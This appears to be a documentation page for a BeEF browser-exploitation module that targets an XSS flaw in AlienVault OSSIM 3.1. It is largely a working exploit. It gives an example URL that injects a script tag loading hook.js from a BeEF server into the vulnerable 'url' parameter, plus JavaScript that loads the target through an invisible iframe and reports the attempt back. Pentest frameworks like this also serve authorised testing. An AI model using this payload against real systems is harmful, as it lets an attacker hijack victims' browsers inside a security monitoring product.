## Summary

* **Objective**: Attempts to hook AlienVault OSSIM 3.1 using XSS
* **Authors**: bcoles, muts
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/exploits/xss/alienvault_ossim_3.1_xss)

## Internal Working

Creates an iframe targetting the AlienVault endpoint vulnerable to XSS.

Example target URL: 
`http://target/ossim/top.php?option=3&soption=3&url=<script src=http://0.0.0.0:3000/hook.js></script>`


```js
        var uri = beef.encode.base64.decode('<%= Base64.strict_encode64(@uri) %>');

        var alienvault_iframe_<%= @command_id %> = beef.dom.createInvisibleIframe();
        alienvault_iframe_<%= @command_id %>.setAttribute('src', uri);

        beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");

```

## References

http://www.exploit-db.com/exploits/20062/


## Feedback

